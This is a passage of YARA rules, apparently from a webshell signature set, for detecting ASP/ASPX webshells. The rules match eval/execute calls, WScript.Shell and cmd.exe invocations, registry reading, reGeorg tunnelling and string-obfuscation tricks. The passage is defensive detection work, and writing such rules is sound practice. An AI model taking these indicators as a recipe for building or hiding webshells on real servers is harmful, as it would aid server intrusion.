$sniff3 = ".SetSocketOption(" wide ascii
$sniff4 = ".IOControl(" wide ascii
$sniff5 = "PacketCaptureWriter" fullword wide ascii
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_asp_input
// Request.BinaryRead
// Request.Form
$asp_input1 = "request" fullword nocase wide ascii
$asp_input2 = "Page_Load" fullword nocase wide ascii
// base64 of Request.Form(
$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
$asp_xml_method1 = "GET" fullword wide ascii
$asp_xml_method2 = "POST" fullword wide ascii
$asp_xml_method3 = "HEAD" fullword wide ascii
// dynamic form
$asp_form1 = "<form " wide ascii
$asp_form2 = "<Form " wide ascii
$asp_form3 = "<FORM " wide ascii
$asp_asp   = "<asp:" wide ascii
$asp_text1 = ".text" wide ascii
$asp_text2 = ".Text" wide ascii
condition:
(
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and (
any of ( $asp_input* ) or
(
$asp_xml_http and
any of ( $asp_xml_method* )
) or
(
any of ( $asp_form* ) and
any of ( $asp_text* ) and
$asp_asp
)
)
and filesize < 30KB and all of ( $sniff* )
}
rule SSC_Swebshell_asp_generic_tiny
{
meta:
description = "Generic tiny ASP webshell which uses any eval/exec function indirectly on user input or writes a file"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/07"
modified = "2023-01-06"
hash = "990e3f129b8ba409a819705276f8fa845b95dad0"
hash = "52ce724580e533da983856c4ebe634336f5fd13a"
strings:
$fp1 = "net.rim.application.ipproxyservice.AdminCommand.execute"
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_asp_input
// Request.BinaryRead
// Request.Form
$asp_input1 = "request" fullword nocase wide ascii
$asp_input2 = "Page_Load" fullword nocase wide ascii
// base64 of Request.Form(
$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
$asp_xml_method1 = "GET" fullword wide ascii
$asp_xml_method2 = "POST" fullword wide ascii
$asp_xml_method3 = "HEAD" fullword wide ascii
// dynamic form
$asp_form1 = "<form " wide ascii
$asp_form2 = "<Form " wide ascii
$asp_form3 = "<FORM " wide ascii
$asp_asp   = "<asp:" wide ascii
$asp_text1 = ".text" wide ascii
$asp_text2 = ".Text" wide ascii
//strings from private rule capa_bin_files
$dex   = { 64 65 ( 78 | 79 ) 0a 30 }
$pack  = { 50 41 43 4b 00 00 00 02 00 }
//strings from private rule capa_asp_payload
$asp_payload0  = "eval_r" fullword nocase wide ascii
$asp_payload1  = /\beval\s/ nocase wide ascii
$asp_payload2  = /\beval\(/ nocase wide ascii
$asp_payload3  = /\beval\"\"/ nocase wide ascii
// var Fla = {'E':eval};  Fla.E(code)
$asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
$asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
$asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
$asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
$asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
$asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
$asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
$asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
$asp_multi_payload_one2 = "addcode" fullword wide ascii
$asp_multi_payload_one3 = /\.run\b/ wide ascii
$asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
$asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
$asp_multi_payload_two3 = "BuildManager" fullword wide ascii
$asp_multi_payload_three1 = "System.Diagnostics" wide ascii
$asp_multi_payload_three2 = "Process" fullword wide ascii
$asp_multi_payload_three3 = ".Start" wide ascii
// this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
$asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
$asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
$asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
// execute cmd.exe /c with arguments using ProcessStartInfo
$asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
$asp_multi_payload_five2 = ".Start" nocase wide ascii
$asp_multi_payload_five3 = ".Filename" nocase wide ascii
$asp_multi_payload_five4 = ".Arguments" nocase wide ascii
//strings from private rule capa_asp_write_file
// $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
$asp_always_write1 = /\.write/ nocase wide ascii
$asp_always_write2 = /\.swrite/ nocase wide ascii
//$asp_write_way_one1 = /\.open\b/ nocase wide ascii
$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
$asp_cr_write1 = "CreateObject(" nocase wide ascii
$asp_cr_write2 = "CreateObject (" nocase wide ascii
$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
$asp_streamwriter2 = "filestream" fullword nocase wide ascii
condition:
(
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and (
any of ( $asp_input* ) or
(
$asp_xml_http and
any of ( $asp_xml_method* )
) or
(
any of ( $asp_form* ) and
any of ( $asp_text* ) and
$asp_asp
)
)
and not 1 of ( $fp* ) and not (
uint16(0) == 0x5a4d or
$dex at 0 or
$pack at 0 or
// fp on jar with zero compression
uint16(0) == 0x4b50
)
and
( filesize < 700 and
( (
any of ( $asp_payload* ) or
all of ( $asp_multi_payload_one* ) or
all of ( $asp_multi_payload_two* ) or
all of ( $asp_multi_payload_three* ) or
all of ( $asp_multi_payload_four* ) or
all of ( $asp_multi_payload_five* )
)
or (
any of ( $asp_always_write* ) and
(
any of ( $asp_write_way_one* ) and
any of ( $asp_cr_write* )
) or (
any of ( $asp_streamwriter* )
)
)
) )
}
rule SSC_SWEBSHELL_asp_generic : FILE {
meta:
description = "Generic ASP webshell which uses any eval/exec function indirectly on user input or writes a file"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021-03-07"
modified = "2023-01-06"
score = 60
hash = "a8c63c418609c1c291b3e731ca85ded4b3e0fba83f3489c21a3199173b176a75"
strings:
$asp_much_sus7  = "Web Shell" nocase
$asp_much_sus8  = "WebShell" nocase
$asp_much_sus3  = "hidded shell"
$asp_much_sus4  = "WScript.Shell.1" nocase
$asp_much_sus5  = "AspExec"
$asp_much_sus14 = "\\pcAnywhere\\" nocase
$asp_much_sus15 = "antivirus" nocase
$asp_much_sus16 = "McAfee" nocase
$asp_much_sus17 = "nishang"
$asp_much_sus18 = "\"unsafe" fullword wide ascii
$asp_much_sus19 = "'unsafe" fullword wide ascii
$asp_much_sus28 = "exploit" fullword wide ascii
$asp_much_sus30 = "TVqQAAMAAA" wide ascii
$asp_much_sus31 = "HACKED" fullword wide ascii
$asp_much_sus32 = "hacked" fullword wide ascii
$asp_much_sus33 = "hacker" wide ascii
$asp_much_sus34 = "grayhat" nocase wide ascii
$asp_much_sus35 = "Microsoft FrontPage" wide ascii
$asp_much_sus36 = "Rootkit" wide ascii
$asp_much_sus37 = "rootkit" wide ascii
$asp_much_sus38 = "/*-/*-*/" wide ascii
$asp_much_sus39 = "u\"+\"n\"+\"s" wide ascii
$asp_much_sus40 = "\"e\"+\"v" wide ascii
$asp_much_sus41 = "a\"+\"l\"" wide ascii
$asp_much_sus42 = "\"+\"(\"+\"" wide ascii
$asp_much_sus43 = "q\"+\"u\"" wide ascii
$asp_much_sus44 = "\"u\"+\"e" wide ascii
$asp_much_sus45 = "/*//*/" wide ascii
$asp_much_sus46 = "(\"/*/\"" wide ascii
$asp_much_sus47 = "eval(eval(" wide ascii
$asp_much_sus48 = "Shell.Users" wide ascii
$asp_much_sus49 = "PasswordType=Regular" wide ascii
$asp_much_sus50 = "-Expire=0" wide ascii
$asp_much_sus51 = "sh\"&\"el" wide ascii
$asp_gen_sus1  = /:\s{0,20}eval}/ nocase wide ascii
$asp_gen_sus2  = /\.replace\(\/\w\/g/ nocase wide ascii
$asp_gen_sus6  = "self.delete"
$asp_gen_sus9  = "\"cmd /c" nocase
$asp_gen_sus10 = "\"cmd\"" nocase
$asp_gen_sus11 = "\"cmd.exe" nocase
$asp_gen_sus12 = "%comspec%" wide ascii
$asp_gen_sus13 = "%COMSPEC%" wide ascii
//TODO:$asp_gen_sus12 = ".UserName" nocase
$asp_gen_sus18 = "Hklm.GetValueNames();" nocase
// bonus string for proxylogon exploiting webshells
$asp_gen_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
$asp_gen_sus21 = "\"upload\"" wide ascii
$asp_gen_sus22 = "\"Upload\"" wide ascii
$asp_gen_sus25 = "shell_" wide ascii
//$asp_gen_sus26 = "password" fullword wide ascii
//$asp_gen_sus27 = "passw" fullword wide ascii
// own base64 func
$asp_gen_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
$asp_gen_sus30 = "serv-u" wide ascii
$asp_gen_sus31 = "Serv-u" wide ascii
$asp_gen_sus32 = "Army" fullword wide ascii
$asp_slightly_sus1 = "<pre>" wide ascii
$asp_slightly_sus2 = "<PRE>" wide ascii
// "e"+"x"+"e"
$asp_gen_obf1 = "\"+\"" wide ascii
$fp1 = "DataBinder.Eval"
$fp2 = "B2BTools"
$fp3 = "<b>Failed to execute cache update. See the log file for more information" ascii
$fp4 = "Microsoft. All rights reserved."
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_bin_files
$dex   = { 64 65 ( 78 | 79 ) 0a 30 }
$pack  = { 50 41 43 4b 00 00 00 02 00 }
//strings from private rule capa_asp_input
// Request.BinaryRead
// Request.Form
$asp_input1 = "request" fullword nocase wide ascii
$asp_input2 = "Page_Load" fullword nocase wide ascii
// base64 of Request.Form(
$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
$asp_xml_method1 = "GET" fullword wide ascii
$asp_xml_method2 = "POST" fullword wide ascii
$asp_xml_method3 = "HEAD" fullword wide ascii
// dynamic form
$asp_form1 = "<form " wide ascii
$asp_form2 = "<Form " wide ascii
$asp_form3 = "<FORM " wide ascii
$asp_asp   = "<asp:" wide ascii
$asp_text1 = ".text" wide ascii
$asp_text2 = ".Text" wide ascii
//strings from private rule capa_asp_payload
$asp_payload0  = "eval_r" fullword nocase wide ascii
$asp_payload1  = /\beval\s/ nocase wide ascii
$asp_payload2  = /\beval\(/ nocase wide ascii
$asp_payload3  = /\beval\"\"/ nocase wide ascii
// var Fla = {'E':eval};  Fla.E(code)
$asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
$asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
$asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
$asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
$asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
$asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
$asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
$asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
$asp_multi_payload_one2 = "addcode" fullword wide ascii
$asp_multi_payload_one3 = /\.run\b/ wide ascii
$asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
$asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
$asp_multi_payload_two3 = "BuildManager" fullword wide ascii
$asp_multi_payload_three1 = "System.Diagnostics" wide ascii
$asp_multi_payload_three2 = "Process" fullword wide ascii
$asp_multi_payload_three3 = ".Start" wide ascii
// this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
$asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
$asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
$asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
// execute cmd.exe /c with arguments using ProcessStartInfo
$asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
$asp_multi_payload_five2 = ".Start" nocase wide ascii
$asp_multi_payload_five3 = ".Filename" nocase wide ascii
$asp_multi_payload_five4 = ".Arguments" nocase wide ascii
//strings from private rule capa_asp_write_file
// $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
$asp_always_write1 = /\.write/ nocase wide ascii
$asp_always_write2 = /\.swrite/ nocase wide ascii
//$asp_write_way_one1 = /\.open\b/ nocase wide ascii
$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
$asp_cr_write1 = "CreateObject(" nocase wide ascii
$asp_cr_write2 = "CreateObject (" nocase wide ascii
$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
$asp_streamwriter2 = "filestream" fullword nocase wide ascii
//strings from private rule capa_asp_classid
$tagasp_capa_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_capa_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_capa_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_capa_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_capa_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
condition:
(
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and not (
uint16(0) == 0x5a4d or
$dex at 0 or
$pack at 0 or
// fp on jar with zero compression
uint16(0) == 0x4b50
)
and (
any of ( $asp_input* ) or
(
$asp_xml_http and
any of ( $asp_xml_method* )
) or
(
any of ( $asp_form* ) and
any of ( $asp_text* ) and
$asp_asp
)
)
and (
any of ( $asp_payload* ) or
all of ( $asp_multi_payload_one* ) or
all of ( $asp_multi_payload_two* ) or
all of ( $asp_multi_payload_three* ) or
all of ( $asp_multi_payload_four* ) or
all of ( $asp_multi_payload_five* )
)
and not any of ( $fp* ) and
( ( filesize < 3KB and
( 1 of ( $asp_slightly_sus* ) ) ) or
( filesize < 25KB and
( 1 of ( $asp_much_sus* ) or 1 of ( $asp_gen_sus* ) or
( #asp_gen_obf1 > 2 ) ) ) or
( filesize < 50KB and
( 1 of ( $asp_much_sus* ) or 3 of ( $asp_gen_sus* ) or
( #asp_gen_obf1 > 6 ) ) ) or
( filesize < 150KB and
( 1 of ( $asp_much_sus* ) or 4 of ( $asp_gen_sus* ) or
( #asp_gen_obf1 > 6 ) or
( (
any of ( $asp_always_write* ) and
(
any of ( $asp_write_way_one* ) and
any of ( $asp_cr_write* )
) or (
any of ( $asp_streamwriter* )
)
)
and
( 1 of ( $asp_much_sus* ) or 2 of ( $asp_gen_sus* ) or
( #asp_gen_obf1 > 3 ) ) ) ) ) or
( filesize < 100KB and (
any of ( $tagasp_capa_classid* )
)
) )
}
rule SSC_Swebshell_asp_generic_registry_reader
{
meta:
description = "Generic ASP webshell which reads the registry (might look for passwords, license keys, database settings, general recon, ..."
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/03/14"
modified = "2022-12-01"
score = 50
strings:
/* $asp_reg1  = "Registry" fullword wide ascii */ /* too many matches issues */
$asp_reg2  = "LocalMachine" fullword wide ascii
$asp_reg3  = "ClassesRoot" fullword wide ascii
$asp_reg4  = "CurrentUser" fullword wide ascii
$asp_reg5  = "Users" fullword wide ascii
$asp_reg6  = "CurrentConfig" fullword wide ascii
$asp_reg7  = "Microsoft.Win32" fullword wide ascii
$asp_reg8  = "OpenSubKey" fullword wide ascii
$sus1 = "shell" fullword nocase wide ascii
$sus2 = "cmd.exe" fullword wide ascii
$sus3 = "<form " wide ascii
$sus4 = "<table " wide ascii
$sus5 = "System.Security.SecurityException" wide ascii
$fp1 = "Avira Operations GmbH" wide
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_asp_input
// Request.BinaryRead
// Request.Form
$asp_input1 = "request" fullword nocase wide ascii
$asp_input2 = "Page_Load" fullword nocase wide ascii
// base64 of Request.Form(
$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
$asp_xml_method1 = "GET" fullword wide ascii
$asp_xml_method2 = "POST" fullword wide ascii
$asp_xml_method3 = "HEAD" fullword wide ascii
// dynamic form
$asp_form1 = "<form " wide ascii
$asp_form2 = "<Form " wide ascii
$asp_form3 = "<FORM " wide ascii
$asp_asp   = "<asp:" wide ascii
$asp_text1 = ".text" wide ascii
$asp_text2 = ".Text" wide ascii
condition:
(
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and all of ( $asp_reg* ) and any of ( $sus* ) and not any of ( $fp* ) and
( filesize < 10KB or
( filesize < 150KB and (
any of ( $asp_input* ) or
(
$asp_xml_http and
any of ( $asp_xml_method* )
) or
(
any of ( $asp_form* ) and
any of ( $asp_text* ) and
$asp_asp
)
)
) )
}
rule SSC_Swebshell_aspx_regeorg_csharp
{
meta:
description = "Webshell regeorg aspx c# version"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
reference = "https://github.com/sensepost/reGeorg"
hash = "c1f43b7cf46ba12cfc1357b17e4f5af408740af7ae70572c9cf988ac50260ce1"
author = "Arnim Rupp"
date = "2021/01/11"
strings:
$input_sa1 = "Request.QueryString.Get" fullword nocase wide ascii
$input_sa2 = "Request.Headers.Get" fullword nocase wide ascii
$sa1 = "AddressFamily.InterNetwork" fullword nocase wide ascii
$sa2 = "Response.AddHeader" fullword nocase wide ascii
$sa3 = "Request.InputStream.Read" nocase wide ascii
$sa4 = "Response.BinaryWrite" nocase wide ascii
$sa5 = "Socket" nocase wide ascii
$georg = "Response.Write(\"Georg says, 'All seems fine'\")"
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
